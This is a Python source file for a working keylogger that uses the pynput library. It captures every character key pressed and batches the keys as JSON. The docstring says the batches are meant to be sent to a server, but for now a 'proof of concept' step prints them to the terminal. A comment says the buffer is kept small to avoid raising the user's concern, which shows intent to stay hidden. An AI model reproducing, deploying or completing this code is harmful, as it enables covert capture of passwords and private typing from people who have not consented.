from typing import List, Final, Dict
import json

from pynput import keyboard  # type: ignore

# Maximum number of keys to save, keep low to avoid memory issues
# that could warrant concern from user
SAVED_KEYS_LIMIT: Final[int] = 1024


class Keylogger:
    """
    Logs keyboard events by their names at a lot limit of 1024 then sends logged keys
    to server as JSON.

    Example
    -------

    {"keys_pressed": ["shift", "space", ...] }
    """

    keys_pressed: List[str]

    def __init__(self):
        self.keys_pressed = []

    def log_key(self, key: keyboard.Key):
        """
        Logs keyboard event by name

        Paramters
        ---------

        event: KeyboardEvent
             Event to log
        """
        try:
            self.keys_pressed.append(key.char)
        except AttributeError:
            # special or invalid key do nothing
            pass

        if len(self.keys_pressed) >= SAVED_KEYS_LIMIT:
            # TODO: make network call to server
            #
            # Proof of concept: print to terminal
            print(self.__to_json())
            self.keys_pressed.clear()

    def __to_json(self) -> str:
        """
        Converts the current object to JSON

        Returns
        -------

        str
             Object represented as JSON
             { "keys_pressed": ["shift", "space", ...] }
        """
        keys_json: Dict[str, List[str]] = {"keys_pressed": self.keys_pressed}
        return json.dumps(keys_json)


keylogger = Keylogger()
with keyboard.Listener(on_press=keylogger.log_key) as listener:
    listener.join()
